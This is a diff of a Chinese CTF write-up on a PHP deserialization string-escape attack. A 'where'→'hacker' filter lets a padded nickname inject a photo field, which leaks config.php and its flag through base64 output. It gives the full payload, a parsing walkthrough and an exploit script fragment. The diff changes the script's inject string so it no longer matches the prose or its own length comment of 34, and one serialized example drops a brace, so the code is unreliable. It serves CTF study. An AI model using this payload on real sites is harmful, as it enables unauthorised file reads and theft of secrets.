@@ -22,10 +22,10 @@ categories: ["Writeup"]
 |------|------|
 | `index.php` | 登录页面 |
 | `register.php` | 注册页面 |
-| `update.php` | 更新个人信息（文件上传 + 数据入库） |
-| `profile.php` | 展示个人信息（触发文件读取） |
-| `class.php` | 核心类（user + mysql） |
-| `config.php` | 配置文件（含 flag） |
+| `update.php` | 更新个人信息（文件上传 + 数据入库）|
+| `profile.php` | 展示个人信息（触发文件读取）|
+| `class.php` | 核心类（user + mysql）|
+| `config.php` | 配置文件（含 flag）|
 
 ---
 
@@ -107,51 +107,134 @@ if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname'
 
 ---
 
-## Payload 构造
+## 攻击流程
 
-### 目标
-
-让反序列化后的数组中，`photo` 字段指向目标文件（如 `config.php`）。
-
-### 原始序列化结构
+### 完整数据流
 
 ```
-a:4:{s:5:"phone";s:11:"13800138000";s:5:"email";s:5:"a@b.c";s:8:"nickname";a:1:{i:0;s:204:"PAYLOAD";}s:5:"photo";s:39:"upload/xxxxxx";}
+用户访问 update.php
+    ↓ 提交表单（phone/email/nickname[]/photo）
+update.php 构造 $profile 数组
+    ↓ serialize($profile) 生成序列化字符串
+filter() 替换 where → hacker（长度 +N）
+    ↓ SQL UPDATE 存入数据库
+用户访问 profile.php
+    ↓ 从数据库读取 profile 字段
+unserialize() 反序列化（因长度差解析出错，photo 被篡改）
+    ↓ file_get_contents('config.php')
+base64_encode() 编码文件内容
+    ↓ 输出到 <img> 标签
+用户提取 base64 并解码得到 flag
 ```
 
-### 构造方法
+### 注入过程详解
 
-1. **确定注入内容**：
-   ```
-   ";}s:5:"photo";s:10:"config.php";}
-   ```
-   - `";` — 结束字符串
-   - `}` — 结束 nickname 数组
-   - `s:5:"photo";s:10:"config.php";}` — 在外层数组注入新的 `photo` 字段
+#### 第一步：确定注入目标
 
-2. **计算长度**：
-   注入内容长度 = 34
+目标是让 `$profile['photo']` 的值变成 `'config.php'`。
 
-3. **计算 where 数量**：
-   每个 `where` 替换为 `hacker`，长度 +1。需要 34 个 `where` 来产生 34 的长度差。
+在 PHP 序列化格式中，一个字段表示为：
+```
+s:5:"photo";s:10:"config.php";
+```
 
-4. **最终 payload**：
-   ```
-   where * 34 + ";}s:5:"photo";s:10:"config.php";}
-   ```
+但我们需要先结束 nickname 数组，再在外层注入这个字段。所以注入内容是：
+```
+";}s:5:"photo";s:10:"config.php";}
+```
 
-### 替换后的效果
+拆解：
+| 片段 | 作用 |
+|------|------|
+| `"` | 结束当前字符串 |
+| `;` | 分隔符 |
+| `}` | 结束 nickname 数组 |
+| `s:5:"photo"` | 声明新字段名 "photo" |
+| `;` | 分隔符 |
+| `s:10:"config.php"` | 字段值 "config.php" |
+| `}` | 结束外层数组 |
 
-原始 nickname 值长度声明为 204，实际值经过 filter 后：
-- 前 204 个字符变成 34 个 `hacker`
-- 后面紧跟 `";}s:5:"photo";s:10:"config.php";}`
+#### 第二步：计算 where 数量
 
-PHP 反序列化时：
-1. 读取 204 个字符作为字符串值
-2. 遇到 `";}` — 字符串结束，数组结束
-3. 遇到 `s:5:"photo"` — 解析为外层数组的新字段
-4. `config.php` 成为 `photo` 的值
-5. 外层数组原始 `photo` 字段被忽略
+注入内容长度 = 34。
+
+每个 `where`（5 字符）被替换为 `hacker`（6 字符），长度 +1。
+
+所以需要 **34 个 `where`** 来产生 34 的长度差。
+
+#### 第三步：构造最终 payload
+
+```
+where * 34 + ";}s:5:"photo";s:10:"config.php";}
+```
+
+原始长度 = 34×5 + 34 = 204。
+
+#### 第四步：理解替换后的序列化字符串
+
+原始序列化（未经 filter）：
+```
+a:4:{s:5:"phone";s:11:"13800138000";s:5:"email";s:5:"a@b.c";s:8:"nickname";a:1:{i:0;s:204:"wherewhere...where";s:5:"photo";s:10:"config.php";}s:5:"photo";s:39:"upload/xxxxxx";}
+```
+
+经过 filter 替换后：
+```
+a:4:{...s:8:"nickname";a:1:{i:0;s:204:"hackerhacker...hacker";s:5:"photo";s:10:"config.php";}
+s:5:"photo";s:39:"upload/xxxxxx";}
+```
+
+**关键变化**：
+- `s:204` 声明长度是 204
+- 实际值前 204 个字符是 34 个 `hacker`
+- 后面紧跟 `";}s:5:"photo"...`
+
+#### 第五步：PHP 反序列化时的解析过程
+
+PHP 反序列化器从左到右扫描：
+
+1. 读取数组 `a:4`，开始解析 4 个字段
+2. 解析 `phone`、`email`，正常
+3. 解析 `nickname`，发现是数组 `a:1`
+4. 在 nickname 数组内，读取字符串声明 `s:204`
+5. **读取 204 个字符**：正好是 34 个 `hacker`（204 字符）
+6. 遇到 `";}`：字符串结束，nickname 数组结束
+7. 遇到 `s:5:"photo"`：解析为外层数组的新字段
+8. 遇到 `s:10:"config.php"`：`photo` 的值变成 `config.php`
+9. 遇到 `}`：**外层数组结束！**
+10. 后面的 `;s:5:"photo";s:39:"upload/xxxxxx";}` **被忽略**
+
+最终解析结果：
+```php
+$profile = [
+    'phone' => '13800138000',
+    'email' => 'a@b.c',
+    'nickname' => ['hackerhacker...'],  // 被吞掉的 34 个 hacker
+    'photo' => 'config.php'               // ✅ 被篡改了！
+];
+```
+
+#### 第六步：触发文件读取
+
+`profile.php` 执行：
+```php
+$photo = base64_encode(file_get_contents($profile['photo']));
+// 实际执行：
+// $photo = base64_encode(file_get_contents('config.php'));
+```
+
+服务器上的 `config.php` 内容被读取并 base64 编码，输出到页面：
+```html
+<img src="data:image/gif;base64,PD9waHA...">
+```
+
+解码后得到：
+```php
+<?php
+$config['hostname'] = '127.0.0.1';
+...
+$flag = 'DASCTF{46a944ad-dc22-4fd2-89ab-a88e758b6108}';
+?>
+```
 
 ---
 
@@ -204,7 +287,7 @@ s.post(f"{URL}/register.php", data={"username": "hack", "password": "hack"})
 s.post(f"{URL}/index.php", data={"username": "hack", "password": "hack"})
 
 # 构造 payload
-inject = '";}s:5:"photo";s:10:"config.php";}'
+inject = '";s:5:"photo";s:10:"config.php";}'
 where_count = len(inject)  # 34
 payload = 'where' * where_count + inject
 
